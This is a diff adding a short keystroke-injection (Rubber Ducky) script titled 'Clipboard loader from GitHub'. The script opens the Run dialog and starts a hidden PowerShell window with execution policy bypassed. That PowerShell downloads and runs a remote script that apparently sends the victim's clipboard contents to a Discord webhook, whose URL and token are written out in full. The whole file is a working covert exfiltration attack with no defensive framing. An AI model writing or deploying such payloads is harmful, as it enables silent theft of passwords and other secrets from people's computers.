@@ -1,0 +1,7 @@
+REM Clipboard loader from GitHub
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING Start-Process powershell.exe `-WindowStyle Hidden `-ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; `$webhookUrl = 'https://discord.com/api/webhooks/1481278022794346737/501Qoq8UAy4qMXreJZpeNbBDrrPnoOZJMVcY2utFTOf471M8S1qERxtiY9I3G6c25AJT'; iex (iwr 'https://raw.githubusercontent.com/ash-indigo/RubberDucky/main/Clipboard%20to%20Discord/send-clipboard-to-discord.ps1' -UseBasicParsing)"
+ENTER
